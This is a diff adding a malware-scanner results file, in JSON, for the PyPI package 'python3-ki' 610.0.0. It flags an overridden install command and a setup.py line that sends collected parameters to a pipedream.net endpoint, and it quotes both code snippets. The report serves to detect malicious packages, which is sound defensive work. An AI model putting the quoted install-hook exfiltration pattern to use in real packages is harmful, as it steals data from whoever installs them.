@@ -1,0 +1,36 @@
+{
+    "issues": 3,
+    "errors": {},
+    "results": {
+        "dll-hijacking": {},
+        "download-executable": {},
+        "shady-links": [
+            {
+                "location": "setup.py:15",
+                "code": "        requests.get(\"https://eolunbv9e34gp3b.m.pipedream.net\",params = ploads)\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            }
+        ],
+        "cmd-overwrite": [
+            {
+                "location": "setup.py:18",
+                "code": "setup(name='python3-ki', \n      version='610.0.0',\n      description='AnupamAs01',\n      author='AnupamAs01',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n",
+                "message": "This package is overwriting the 'install' command in setup.py"
+            }
+        ],
+        "exfiltrate-sensitive-data": [
+            {
+                "location": "setup.py:15",
+                "code": "        requests.get(\"https://eolunbv9e34gp3b.m.pipedream.net\",params = ploads)\n",
+                "message": "This package is exfiltrating sensitive data to a remote server"
+            }
+        ],
+        "obfuscation": {},
+        "steganography": {},
+        "silent-process-execution": {},
+        "clipboard-access": {},
+        "code-execution": {},
+        "exec-base64": {}
+    },
+    "path": "./dataset/pypi/python3-ki-610.0.0"
+}
